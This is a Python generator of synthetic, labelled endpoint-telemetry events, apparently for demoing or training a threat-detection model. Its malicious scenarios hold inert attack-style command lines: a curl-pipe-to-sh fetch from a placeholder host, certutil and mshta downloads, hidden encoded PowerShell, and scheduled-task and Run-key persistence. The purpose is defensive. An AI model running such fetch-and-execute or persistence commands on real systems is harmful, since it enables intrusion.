"""Safe replay-event JSONL generator for the demo.

Emits ``NormalizedEvent``-shaped JSON objects (one per line). All command lines, paths and
indicators are inert strings: reserved domains (``.test`` / ``.invalid``, RFC 6761), TEST-NET
addresses (RFC 5737), no real payloads, nothing is executed. Ground truth lives in
``raw_metadata`` (``synthetic``, ``scenario``, ``label``, ``group_id``).

These events are generated independently of the feature rows in ``synthetic.py`` (they are two
views of the same scenario catalogue, not derived from each other).
"""

from __future__ import annotations

import json
import uuid
from datetime import UTC, datetime, timedelta
from pathlib import Path
from typing import Any

import numpy as np

from ml.datasets.scenarios import SCENARIOS
from ml.datasets.synthetic import DEFAULT_SEED

BASE_TIME = datetime(2025, 1, 1, 9, 0, 0, tzinfo=UTC)
_NS = uuid.UUID("6f1c5e0e-7a52-4c1a-9d0e-0c3a9f7e0001")
# Benign base64 of "Write-Host 'centralium-demo'" style inert text.
_INERT_B64 = "VwByAGkAdABlAC0ASABvAHMAdAAgACcAZABlAG0AbwAnAA=="

PS = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"


def _templates(rng: np.random.Generator, scenario: str) -> list[dict[str, Any]]:
    ip = f"203.0.113.{int(rng.integers(1, 250))}"  # TEST-NET-3
    docs = r"C:\Users\demo\Documents"

    def proc(name: str, path: str, cmd: str, parent: str, signer: str = "Demo Vendor") -> dict[str, Any]:
        return {
            "event_type": "process_start",
            "process_name": name,
            "executable_path": path,
            "command_line": cmd,
            "parent_process": parent,
            "signer": signer,
        }

    if scenario == "normal_process":
        return [
            proc("explorer.exe", r"C:\Windows\explorer.exe", "explorer.exe", "userinit.exe", "Demo OS"),
            proc(
                "notepad.exe",
                r"C:\Windows\System32\notepad.exe",
                "notepad.exe notes.txt",
                "explorer.exe",
                "Demo OS",
            ),
            {"event_type": "file_modify", "process_name": "notepad.exe", "file_path": docs + r"\notes.txt"},
        ]
    if scenario == "benign_installer":
        return [
            proc(
                "setup.exe",
                r"C:\Users\demo\Downloads\setup.exe",
                "setup.exe /quiet",
                "explorer.exe",
                "Demo Vendor",
            ),
            *[
                {
                    "event_type": "file_create",
                    "process_name": "setup.exe",
                    "file_path": rf"C:\Program Files\DemoApp\lib{i}.dll",
                }
                for i in range(6)
            ],
            {
                "event_type": "registry_create",
                "process_name": "setup.exe",
                "registry_key": r"HKLM\SOFTWARE\DemoApp\Install",
            },
        ]
    if scenario == "browser_activity":
        return [
            proc("browser.exe", r"C:\Program Files\Browser\browser.exe", "browser.exe", "explorer.exe"),
            *[
                {
                    "event_type": "network_connect",
                    "process_name": "browser.exe",
                    "destination_ip": f"198.51.100.{i + 1}",
                    "destination_port": 443,
                    "domain": f"cdn{i}.example.test",
                    "protocol": "tcp",
                }
                for i in range(5)
            ],
        ]
    if scenario == "developer_workflow":
        return [
            proc("bash", "/usr/bin/bash", "bash -lc 'make test'", "code", "Demo OS"),
            proc("git", "/usr/bin/git", "git status", "bash", "Demo OS"),
            proc("python3", "/usr/bin/python3", "python3 -m pytest -q", "bash", "Demo OS"),
            {
                "event_type": "file_create",
                "process_name": "python3",
                "file_path": "/home/demo/proj/.pytest_cache/v/x",
            },
        ]
    if scenario == "suspicious_powershell":
        return [
            proc(
                "powershell.exe",
                PS,
                f"powershell.exe -NoP -W Hidden -Enc {_INERT_B64}",
                "winword.exe",
                "Demo OS",
            ),
            {
                "event_type": "network_connect",
                "process_name": "powershell.exe",
                "destination_ip": ip,
                "destination_port": 8080,
                "domain": "payload-host.invalid",
                "protocol": "tcp",
            },
            {
                "event_type": "file_create",
                "process_name": "powershell.exe",
                "file_path": r"C:\Users\demo\AppData\Local\Temp\demo_stage.ps1",
            },
        ]
    if scenario == "suspicious_shell":
        return [
            proc(
                "sh", "/bin/sh", "sh -c 'curl -s http://payload-host.invalid/x.sh | sh'", "apache2", "Demo OS"
            ),
            {"event_type": "file_create", "process_name": "sh", "file_path": "/srv/demo/.stage"},
            {
                "event_type": "network_connect",
                "process_name": "curl",
                "destination_ip": ip,
                "destination_port": 80,
                "protocol": "tcp",
            },
        ]
    if scenario == "unusual_network":
        return [
            {
                "event_type": "dns_query",
                "process_name": "svc.exe",
                "domain": f"{''.join(chr(97 + int(c)) for c in rng.integers(0, 26, 18))}.invalid",
            },
            *[
                {
                    "event_type": "network_connect",
                    "process_name": "svc.exe",
                    "destination_ip": ip,
                    "destination_port": 4444 + i,
                    "protocol": "tcp",
                }
                for i in range(4)
            ],
        ]
    if scenario == "mass_file_writes":
        return [
            {
                "event_type": "file_create",
                "process_name": "archiver.exe",
                "file_path": rf"{docs}\out\part{i}.bin",
            }
            for i in range(12)
        ]
    if scenario == "ransomware_like":
        return [
            proc(
                "locker_sim.exe",
                r"C:\Users\demo\AppData\Local\Temp\locker_sim.exe",
                "locker_sim.exe --simulate",
                "explorer.exe",
                "",
            ),
            proc(
                "vssadmin.exe",
                r"C:\Windows\System32\vssadmin.exe",
                "vssadmin.exe list shadows",
                "locker_sim.exe",
                "Demo OS",
            ),
            *[
                ev
                for i in range(6)
                for ev in (
                    {
                        "event_type": "file_modify",
                        "process_name": "locker_sim.exe",
                        "file_path": rf"{docs}\doc{i}.docx",
                    },
                    {
                        "event_type": "file_rename",
                        "process_name": "locker_sim.exe",
                        "file_path": rf"{docs}\doc{i}.docx.demoenc",
                    },
                )
            ],
        ]
    if scenario == "persistence_creation":
        return [
            {
                "event_type": "registry_create",
                "process_name": "upd.exe",
                "registry_key": r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run\DemoUpdater",
            },
            {
                "event_type": "scheduled_task",
                "process_name": "schtasks.exe",
                "command_line": "schtasks /create /tn DemoTask /tr C:\\Users\\demo\\upd.exe /sc onlogon",
            },
            {"event_type": "persistence", "process_name": "crontab", "file_path": "/var/spool/cron/demo"},
        ]
    if scenario == "lolbin_abuse":
        return [
            proc(
                "certutil.exe",
                r"C:\Windows\System32\certutil.exe",
                "certutil.exe -urlcache -f http://payload-host.invalid/a.bin a.bin",
                "cmd.exe",
                "Demo OS",
            ),
            proc(
                "rundll32.exe",
                r"C:\Windows\System32\rundll32.exe",
                r"rundll32.exe C:\Users\demo\a.dll,Run",
                "cmd.exe",
                "Demo OS",
            ),
            proc(
                "mshta.exe",
                r"C:\Windows\System32\mshta.exe",
                "mshta.exe http://payload-host.invalid/x.hta",
                "winword.exe",
                "Demo OS",
            ),
        ]
    raise KeyError(scenario)


def generate_replay(seed: int = DEFAULT_SEED, groups_per_scenario: int = 3) -> list[dict[str, Any]]:
    """Deterministic list of NormalizedEvent dicts (JSON-serialisable), time-ordered."""
    rng = np.random.default_rng(seed + 1)
    out: list[dict[str, Any]] = []
    t = BASE_TIME
    pid = 4000
    for g in range(groups_per_scenario):
        for sc in SCENARIOS:
            gid = f"{sc.name}-replay{g}"
            host = f"demo-host-{(g % 3) + 1}"
            pid += 7
            for tpl in _templates(rng, sc.name):
                t += timedelta(milliseconds=int(rng.integers(200, 4000)))
                ev: dict[str, Any] = {
                    "event_id": uuid.uuid5(_NS, f"{seed}:{len(out)}").hex,
                    "timestamp": t.isoformat(),
                    "host_id": host,
                    "user": "demo",
                    "pid": pid,
                    "ppid": 1000 + g,
                    "source": "replay",
                    "confidence": 1.0,
                    **tpl,
                    "raw_metadata": {
                        "synthetic": True,
                        "scenario": sc.name,
                        "label": sc.label,
                        "group_id": gid,
                        "malicious": sc.malicious,
                    },
                }
                out.append(ev)
    return out


def write_replay(path: Path, seed: int = DEFAULT_SEED, groups_per_scenario: int = 3) -> int:
    path.parent.mkdir(parents=True, exist_ok=True)
    events = generate_replay(seed, groups_per_scenario)
    with path.open("w", encoding="utf-8", newline="\n") as fh:
        for e in events:
            fh.write(json.dumps(e, sort_keys=True) + "\n")
    return len(events)
